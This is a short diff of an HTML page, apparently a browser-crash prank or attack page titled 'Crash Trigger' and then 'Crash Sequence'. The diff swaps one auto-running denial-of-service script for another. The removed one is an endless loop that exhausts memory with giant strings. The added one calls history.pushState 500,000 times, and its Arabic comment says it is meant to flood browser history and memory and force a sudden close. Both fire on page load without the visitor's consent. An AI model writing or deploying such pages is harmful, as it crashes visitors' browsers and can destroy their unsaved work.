@@ -2,17 +2,17 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Crash Trigger</title>
-</head>
-<body>
-  <h2>جاري المعالجة...</h2>
+  <title>Crash Sequence</title>
   <script>
     window.onload = function() {
-      let total = "";
-      while (true) {
-        total += new Array(10000000).join("crash_memory_buffer_string");
+      // إغراق سجل المتصفح والذاكرة في تكرار سريع للتسبب في إغلاق مفاجئ
+      for (let i = 0; i < 500000; i++) {
+        history.pushState(0, 0, i.toString());
       }
     };
   </script>
+</head>
+<body>
+  <h2>Crash Sequence Running...</h2>
 </body>
 </html>
